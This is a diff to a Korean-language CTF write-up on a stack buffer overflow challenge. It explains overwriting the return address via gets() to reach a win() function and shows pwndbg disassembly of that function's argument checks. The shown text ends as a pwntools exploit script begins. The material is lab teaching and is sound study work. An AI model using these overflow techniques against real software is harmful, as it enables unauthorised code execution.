@@ -71,6 +71,7 @@ vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linke
 <br />
 
 ## 1. 오프셋 구하기
+문제를 풀이하기 위해서는 gets(buf)에서 발생하는 스택 버퍼오버플로우 취약점으로 `RET` 주소를 `win`으로 덮고 실행해야 합니다. 이때, win의 인자와 문제에서 요구하는 값과 일치해야 FLAG가 출력됩니다. 
 ```bash
 $ python3 -q
 >>> from pwn import *
@@ -104,23 +105,20 @@ Corefile('/home/kali/pico/core.754')
 ## 2. `win()`함수 인자의 정확한 오프셋 확인하기
 
 ```asm
-pwndbg> x/60i win
-   0x8049296 <win>:     endbr32
-   0x804929a <win+4>:   push   ebp
-   0x804929b <win+5>:   mov    ebp,esp
-   0x804929d <win+7>:   push   ebx
-   0x804929e <win+8>:   sub    esp,0x54
-...
-   0x8049303 <win+109>: push   eax
-   0x8049304 <win+110>: call   0x8049100 <fgets@plt>
-   0x8049309 <win+115>: add    esp,0x10
-=> 0x804930c <win+118>: cmp    DWORD PTR [ebp+0x8],0xcafef00d
-   0x8049313 <win+125>: jne    0x804932f <win+153>
-   0x8049315 <win+127>: cmp    DWORD PTR [ebp+0xc],0xf00df00d
-   0x804931c <win+134>: jne    0x8049332 <win+156>
-...
+   0x8049371 <vuln+57>    ret
+
+   0x8049300 <win+106>    lea    eax, [ebp - 0x4c]
+   0x8049303 <win+109>    push   eax
+   0x8049304 <win+110>    call   fgets@plt                   <fgets@plt>
+
+   0x8049309 <win+115>    add    esp, 0x10
+ ► 0x804930c <win+118>    cmp    dword ptr [ebp + 8], 0xcafef00d
+   0x8049313 <win+125>    jne    win+153                     <win+153>
+
+   0x8049315 <win+127>    cmp    dword ptr [ebp + 0xc], 0xf00df00d
+   0x804931c <win+134>    jne    win+156                     <win+156>
 ```
-위 결과로 첫 번째 인자는 `ebp + 0x8`에 위치하고, 두 번째 인자는 `ebp + 0xc`에 위치하는 것을 알 수 있습니다. 분석한 정보를 가지고 공격 코드를 작성할 수 있습니다.
+프로그램을 실행하고 112만큼 값을 입력했을 때,위 결과로 첫 번째 인자는 `ebp + 0x8`에 위치하고, 두 번째 인자는 `ebp + 0xc`에 위치하는 것을 알 수 있습니다. 분석한 정보를 가지고 공격 코드를 작성할 수 있습니다.
 
 ```python
 from pwn import *
